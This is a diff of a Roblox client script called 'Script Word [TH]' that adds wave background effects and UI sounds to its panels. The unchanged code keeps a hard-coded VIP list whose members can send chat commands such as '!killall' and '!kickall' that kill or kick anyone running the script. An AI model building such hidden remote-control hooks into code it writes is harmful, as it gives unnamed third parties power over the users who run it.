@@ -1,4 +1,4 @@
--- [[ Script Word [TH] - Neon Edition (Update VIP List) ]]
+-- [[ Script Word [TH] - Neon Edition (Wave Background Effect) ]]
 
 local Player = game.Players.LocalPlayer
 local Camera = workspace.CurrentCamera
@@ -6,15 +6,49 @@ local MyName = Player.Name
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 
--- [Start Logic] ดีเลย์ 5 วิ + เพลง + Welcome + Credit
+-- [Start Logic] ฟังก์ชันสำหรับเล่นเสียง UI
+local function PlayUISound(id)
+    local s = Instance.new("Sound", game.Workspace)
+    s.SoundId = "rbxassetid://"..tostring(id)
+    s.Volume = 1
+    s:Play()
+    game:GetService("Debris"):AddItem(s, 2)
+end
+
+-- [Effect Logic] ฟังก์ชันเพิ่มเอฟเฟกต์คลื่นตามภาพ (NEW)
+local function AddWaveEffect(frame, waveColor)
+    frame.ClipsDescendants = true
+    
+    local function CreateWave(speed, height, transparency)
+        local wave = Instance.new("ImageLabel")
+        wave.Name = "WaveAnim"
+        wave.Parent = frame
+        wave.BackgroundTransparency = 1
+        wave.Position = UDim2.new(0, 0, 1, -height)
+        wave.Size = UDim2.new(2, 0, 0, height * 2)
+        wave.Image = "rbxassetid://1235232325" -- Texture คลื่นแบบฟุ้ง
+        wave.ImageColor3 = waveColor
+        wave.ImageTransparency = transparency
+        wave.ZIndex = 0
+        
+        task.spawn(function()
+            local pos = 0
+            while frame and frame.Parent do
+                pos = pos - 0.002 * speed
+                if pos <= -1 then pos = 0 end
+                wave.Position = UDim2.new(pos, 0, 1, -height)
+                task.wait(0.02)
+            end
+        end)
+    end
+    
+    -- สร้างคลื่นสองชั้นให้ดูมีมิติเหมือนในรูป
+    CreateWave(1, 60, 0.6)
+    CreateWave(1.5, 45, 0.8)
+end
+
+-- [Start Logic] ลำดับการแสดงผลพร้อมเสียง
 local function ShowWelcome()
-    local Sound = Instance.new("Sound", game.Workspace)
-    Sound.SoundId = "rbxassetid://136735742758927"
-    Sound.Volume = 2
-    Sound:Play()
-    
-    task.wait(5)
-    
     local WelcomeGui = Instance.new("ScreenGui", game.CoreGui)
     
     local function CreateNotify(text, pos)
@@ -32,31 +66,48 @@ local function ShowWelcome()
         return label, WS
     end
 
+    local function PlaySound(id)
+        local s = Instance.new("Sound", game.Workspace)
+        s.SoundId = "rbxassetid://"..tostring(id)
+        s.Volume = 2
+        s:Play()
+        game:GetService("Debris"):AddItem(s, 5)
+    end
+
+    task.wait(5)
+    PlaySound(108729338139883)
     local L1, S1 = CreateNotify("Welcome to Script Word", UDim2.new(0.5, -125, 0.1, 0))
     TweenService:Create(L1, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
     TweenService:Create(S1, TweenInfo.new(0.8), {Transparency = 0}):Play()
     task.wait(2.5)
     
+    PlaySound(104447039817401)
     local L2, S2 = CreateNotify("By Owner Human", UDim2.new(0.5, -125, 0.15, 0))
     TweenService:Create(L2, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
     TweenService:Create(S2, TweenInfo.new(0.8), {Transparency = 0}):Play()
+    task.wait(1.5)
+
+    PlaySound(114665895100803)
+    local L3, S3 = CreateNotify("Monster Kill", UDim2.new(0.5, -125, 0.2, 0))
+    L3.TextColor3 = Color3.fromRGB(255, 50, 50)
+    TweenService:Create(L3, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+    TweenService:Create(S3, TweenInfo.new(0.5), {Transparency = 0}):Play()
     
     task.wait(3)
-    
     TweenService:Create(L1, TweenInfo.new(1), {TextTransparency = 1}):Play()
     TweenService:Create(S1, TweenInfo.new(1), {Transparency = 1}):Play()
     TweenService:Create(L2, TweenInfo.new(1), {TextTransparency = 1}):Play()
     TweenService:Create(S2, TweenInfo.new(1), {Transparency = 1}):Play()
+    TweenService:Create(L3, TweenInfo.new(1), {TextTransparency = 1}):Play()
+    TweenService:Create(S3, TweenInfo.new(1), {Transparency = 1}):Play()
     
     task.wait(1)
     WelcomeGui:Destroy()
-    task.wait(2)
-    Sound:Destroy()
 end
 
 task.spawn(ShowWelcome)
 
--- [Logics] รายชื่อ VIP (เพิ่ม zx71828 เรียบร้อย)
+-- [Logics] รายชื่อ VIP
 _G.VIP_LIST = _G.VIP_LIST or {
     ["ffsww_1007"] = true, ["A_ASPD"] = true, ["HACKER_18050"] = true,
     ["evils915"] = true, ["TV_BTS1"] = true, ["Winwie001"] = true,
@@ -125,7 +176,7 @@ MainGui.Name = "ScriptWordTH_Extreme"
 local AdminPanel = Instance.new("Frame", MainGui)
 AdminPanel.Size = UDim2.new(0, 260, 0, 320); AdminPanel.Position = UDim2.new(0.5, -130, 0.5, -160)
 AdminPanel.BackgroundColor3 = Color3.fromRGB(15, 5, 5); AdminPanel.BackgroundTransparency = 0.1; AdminPanel.Visible = false
-ApplyNeonEffect(AdminPanel, Color3.fromRGB(255, 0, 0)); MakeDraggable(AdminPanel)
+ApplyNeonEffect(AdminPanel, Color3.fromRGB(255, 0, 0)); MakeDraggable(AdminPanel); AddWaveEffect(AdminPanel, Color3.fromRGB(255, 50, 50))
 
 local AdminTitle = Instance.new("TextLabel", AdminPanel)
 AdminTitle.Size = UDim2.new(1, 0, 0, 35); AdminTitle.Text = "Commands Script Word [TH]"
@@ -156,7 +207,7 @@ CmdBar.PlaceholderText = "> ENTER COMMAND..."; Instance.new("UICorner", CmdBar)
 local Board = Instance.new("Frame", MainGui)
 Board.Size = UDim2.new(0, 210, 0, 260); Board.Position = UDim2.new(0.85, 0, 0.3, 0)
 Board.BackgroundColor3 = Color3.fromRGB(10, 10, 10); Board.BackgroundTransparency = 0.15
-ApplyNeonEffect(Board, Color3.fromRGB(255, 215, 0)); MakeDraggable(Board)
+ApplyNeonEffect(Board, Color3.fromRGB(255, 215, 0)); MakeDraggable(Board); AddWaveEffect(Board, Color3.fromRGB(255, 215, 0))
 
 local BoardTitle = Instance.new("TextLabel", Board)
 BoardTitle.Size = UDim2.new(1, 0, 0, 40); BoardTitle.Text = "Script Word [TH]"
@@ -175,6 +226,7 @@ local function CreateBtn(txt, pos, color)
     local bs = Instance.new("UIStroke", b); bs.Thickness = 2; bs.Color = Color3.new(1,1,1)
     b.MouseEnter:Connect(function() TweenService:Create(b, TweenInfo.new(0.3), {Size = UDim2.new(0, 55, 0, 55), BackgroundColor3 = Color3.new(1,1,1), TextColor3 = color}):Play() end)
     b.MouseLeave:Connect(function() TweenService:Create(b, TweenInfo.new(0.3), {Size = UDim2.new(0, 48, 0, 48), BackgroundColor3 = color, TextColor3 = Color3.new(1,1,1)}):Play() end)
+    b.MouseButton1Click:Connect(function() PlayUISound(452267918) end)
     MakeDraggable(b); return b
 end
 
@@ -213,6 +265,7 @@ local function ListenChat(speaker, msg)
     end
     local target = args[2] and findTarget(args[2])
     if _G.VIP_LIST[speaker.Name] or ADMIN_COMMANDER[speaker.Name] then
+        if speaker ~= Player then PlayUISound(203785501) end
         if cmd == "!killall" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
         elseif cmd == "!kickall" then CustomKick() end
         local canExecute = (ADMIN_COMMANDER[speaker.Name] and target == Player) or (speaker == Player and (not target or target == Player)) or (target == Player and GIFTED_LIST[target.Name] == speaker.Name)
@@ -231,7 +284,7 @@ local function ListenChat(speaker, msg)
     if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then AdminPanel.Visible = true; MinAdminBtn.Visible = true end
 end
 
-CmdBar.FocusLost:Connect(function(e) if e then ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
+CmdBar.FocusLost:Connect(function(e) if e then PlayUISound(452267918); ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
 game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) ListenChat(p,m) end); UpdateBoard() end)
 for _,p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(m) ListenChat(p,m) end) end
 game.Players.PlayerRemoving:Connect(UpdateBoard)
